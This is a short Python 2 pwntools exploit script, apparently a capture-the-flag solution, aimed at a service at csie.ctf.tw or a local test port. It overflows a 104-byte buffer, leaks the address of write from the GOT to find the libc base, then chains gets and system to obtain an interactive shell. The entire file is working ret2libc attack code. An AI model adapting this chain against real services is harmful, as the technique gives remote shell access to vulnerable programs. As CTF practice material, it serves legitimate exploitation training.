#!/usr/bin/env python
# -*- coding:utf-8 -*-

from pwn import *

if __debug__:
    r = remote('127.0.0.1', 8001)
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
    r = remote('csie.ctf.tw', 10114)
    libc = ELF('./libc.so.6-904ccfdc58b689db3729b31171931f2e')


main = 0x804855c
write_plt = 0x80483e0
write_got = 0x804a020

write_off = libc.symbols['write']
print "write_off = ", write_off
system_off = libc.symbols['system']
print "system_off = ", system_off
gets_off = libc.symbols['gets']

raw_input('pause')

r.send('0'*104 +
       p32(write_plt) +
       p32(main) +
       p32(1) +
       p32(write_got) +
       p32(4) +
      '\n')
#r.send('0000000020')
plt_got_content = r.recvrepeat(0.5)[:4]
print hex(u32(plt_got_content))
base = u32(plt_got_content) - write_off

system = base + system_off
gets = base + gets_off

ret = 0x0804835a

r.send(p32(ret) * 50 +
       p32(gets) +
       p32(system) +
       p32(write_got) +
       p32(write_got) +
       '\n')


r.interactive()
